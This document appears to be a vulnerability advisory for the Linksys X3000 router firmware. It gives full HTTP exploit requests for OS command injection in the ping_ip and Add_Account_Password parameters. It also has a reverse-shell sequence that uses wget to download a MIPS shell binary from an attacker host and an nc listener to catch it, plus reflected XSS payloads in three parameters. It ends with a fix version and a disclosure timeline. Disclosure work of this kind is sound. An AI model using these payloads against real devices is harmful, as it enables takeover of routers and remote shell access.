@@ -1,0 +1,157 @@
+Device: X3000
+Vendor: Linksys
+
+============  Vulnerable Firmware Releases: ============ 
+ 
+Firmware Version:  	v1.0.03 build 001 Jun 11,2012
+
+============ Vulnerability Overview: ============
+
+* OS Command Injection
+	
+The vulnerability is caused by missing input validation in the ping_ip parameter and can be exploited to inject and execute arbitrary shell commands.
+
+You need to be authenticated to the device or you have to find other methods for inserting the malicious commands.
+
+* OS Command Injection - Vector 1 (1):
+	=> Parameter: ping_ip
+
+Example Exploit:
+POST /apply.cgi HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.1.1/Diagnostics.asp
+Authorization: Basic XXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 194
+Connection: close
+
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&nowait=1&ping_ip=%3b%20ping%20-c%201%20192%2e168%2e1%2e147%20%3b&ping_size=&ping_times=5&traceroute_ip=
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/x3000-os-command-injection.png
+
+
+=============================
+To get a shell:
+* 1st Request
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&nowait=1&ping_ip=%3b%20wget http://192.168.178.105/mipsbe_reverse_shell.elf -O /tmp/test1%20%3b&ping_size=&ping_times=5&traceroute_ip=
+
+	=> 2nd Request: Requesting change of permissions
+	=> 3rd Request: Requesting execution of your payload
+
+* Webserver is hosting Big endian MIPS Shellcode:
+# ls /var/www/
+mipsbe_reverse_shell.elf
+
+* starting local listener via netcat:
+# nc -vlp 4444
+listening on [any] 4444 ...
+192.168.178.188: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.178.105] from (UNKNOWN) [192.168.178.188] 44424
+<snip>
+=============================
+
+* OS Command Injection - Vector 1 (2):
+	=> Parameter: Add_Account_Password
+
+Example Exploit:
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.188
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.178.188/User_Properties.asp
+Authorization: Basic XXX=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 444
+
+command=device_data&cur_ipaddr=192.168.178.188&next_page=StorageAdminUserAdd1.htm&redirect_timer=1&reboot=0&data1=&next_page=&submit_button=User_Properties&submit_type=create_user&change_action=gozila_cgi&Add_Account_Group_Name=&access_group_name=&delete_groups=&Modify_Account_Name=&Add_Account_Name=pwnd&full_name=pwnd&user_desc=pwnd&Add_Account_Password=`ping%20192%2e168%2e178%2e103`&Add_Account_PasswordConfirm=pwnd&Add_Account_Group=admin
+
+* For changing the password there is no request to the current password (3):
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+* reflected XSS
+
+Injecting scripts into the following parameters reveals that these are not properly validated for malicious input.
+
+	=> Parameter: ping_ip (4)
+	
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.188
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.178.188/Diagnostics.asp
+Authorization: Basic XXX=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 156
+
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&nowait=1&ping_ip=1.1.1.1'><script>alert(1)</script>&ping_size=32&ping_times=5&traceroute_ip=
+
+	=> Parameter: sortby (5)
+	
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.188
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.178.188/DHCPTable.asp
+Authorization: Basic XXX=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+
+submit_button=DHCPTable&change_action=&submit_type=&small_screen=&ip=&mac=&if_name=&nowait=1&sortby=mac"%3balert(1)//
+
+	=> Parameter: submit_button (6)
+
+POST /apply.cgi HTTP/1.1
+Host: 192.168.178.188
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.178.188/WanMAC.asp
+Authorization: Basic XXX=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+
+submit_button=WanMAC'%3balert(1)//&change_action=&submit_type=&action=Apply&wait_time=3&mac_clone_enable=0
+
+============ Solution ============
+
+Update to version "v1.0.05 build 002 Feb 21,2013" to fix the following findings: 
+1, 2, 4, 5, 6
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de/advisories
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+28.01.2013 - discovered vulnerability
+04.02.2013 - Reported vulnerability privately to vendor
+22.02.2013 - Requested update
+25.02.2013 - Linksys responded that there are no updates
+18.03.2013 - Requested update
+ => and some more update requests ...
+08.05.2013 - Testing update from vendor
+08.05.2013 - responded testing results
+21.06.2013 - Linksys informed me about public available firmware update
+22.06.2013 - public disclosure
+
+===================== Advisory end =====================
